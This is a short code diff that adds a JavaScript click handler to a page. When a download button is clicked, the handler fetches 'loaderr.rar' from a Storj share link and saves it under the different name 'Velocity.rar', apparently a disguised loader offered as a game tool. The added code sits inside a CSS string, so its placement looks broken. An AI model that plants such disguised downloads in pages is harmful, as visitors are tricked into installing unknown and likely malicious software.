@@ -256,6 +256,18 @@ document.addEventListener('DOMContentLoaded', () => {
         .spin {
             animation: spin 1s linear infinite;
         }
+
+
+        document.getElementById("downloadBtn").addEventListener("click", function(e) {
+    e.preventDefault();
+    
+    const link = document.createElement("a");
+    link.href = "https://link.storjshare.io/raw/juebo6zx6qdt6ybnb3cjluw5bkta/krnl/loaderr.rar";
+    link.setAttribute("download", "Velocity.rar");
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+});
     `;
     document.head.appendChild(style);
 });
